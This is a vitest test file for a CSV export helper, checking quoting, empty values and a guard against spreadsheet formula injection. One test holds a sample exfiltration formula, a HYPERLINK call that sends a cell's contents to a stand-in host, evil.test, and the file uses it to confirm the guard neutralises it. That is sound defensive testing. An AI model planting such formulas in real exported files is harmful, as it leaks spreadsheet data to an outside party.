import { describe, it, expect } from "vitest";
import { toCsv, csvCell } from "./csv.ts";

describe("csvCell", () => {
  it("passes plain text through untouched", () => {
    expect(csvCell("Costco on 5th")).toBe("Costco on 5th");
  });

  it("renders absent values as empty, not as 'null'", () => {
    expect(csvCell(null)).toBe("");
    expect(csvCell(undefined)).toBe("");
    expect(csvCell("")).toBe("");
  });

  it("keeps numbers unquoted so spreadsheets parse them", () => {
    expect(csvCell(150)).toBe("150");
    expect(csvCell(0)).toBe("0");
  });

  it("quotes fields containing a comma, quote, or newline (RFC 4180)", () => {
    expect(csvCell("Acme, Inc")).toBe('"Acme, Inc"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell("line1\nline2")).toBe('"line1\nline2"');
  });

  // Capture (docs/plan.md §8) writes text extracted from forwarded
  // emails and photos straight into notes/location, so a cell can
  // arrive starting with a formula trigger and execute on open in
  // Excel or Google Sheets.
  describe("spreadsheet formula-injection guard", () => {
    it("neutralises every leading formula trigger", () => {
      expect(csvCell("=1+1")).toBe("'=1+1");
      expect(csvCell("+1")).toBe("'+1");
      expect(csvCell("-1")).toBe("'-1");
      expect(csvCell("@SUM(A1)")).toBe("'@SUM(A1)");
      expect(csvCell("\tcmd")).toBe("'\tcmd");
      // A CR also has to be quoted or it would break the row structure.
      expect(csvCell("\rcmd")).toBe("\"'\rcmd\"");
    });

    it("neutralises the real-world attack shape", () => {
      // Guarding and quoting compose: the apostrophe goes inside the
      // quotes, which is exactly where Excel reads it as "text".
      const attack = '=HYPERLINK("http://evil.test?d="&A1,"Click")';
      expect(csvCell(attack)).toBe(
        '"\'=HYPERLINK(""http://evil.test?d=""&A1,""Click"")"',
      );
      expect(csvCell("=A1,B1")).toBe("\"'=A1,B1\"");
    });

    it("leaves negative numbers alone — they are values, not text", () => {
      expect(csvCell(-150)).toBe("-150");
    });

    it("does not touch a trigger character in the middle of a value", () => {
      expect(csvCell("booth=12")).toBe("booth=12");
    });
  });
});

describe("toCsv", () => {
  it("writes a header row then one row per record, CRLF-separated", () => {
    const csv = toCsv(
      ["date", "client", "amount"],
      [
        ["2026-08-09", "Acme", "150.00"],
        ["2026-08-10", "Globex", "200.00"],
      ],
    );
    expect(csv).toBe(
      "date,client,amount\r\n2026-08-09,Acme,150.00\r\n2026-08-10,Globex,200.00",
    );
  });

  it("returns just the header when there are no rows", () => {
    expect(toCsv(["date", "amount"], [])).toBe("date,amount");
  });

  it("escapes and guards cells inside the rows", () => {
    const csv = toCsv(["note"], [["=cmd"], ["a,b"], [null]]);
    expect(csv).toBe("note\r\n'=cmd\r\n\"a,b\"\r\n");
  });

  it("keeps header cells escaped too", () => {
    expect(toCsv(["amount, USD"], [])).toBe('"amount, USD"');
  });
});
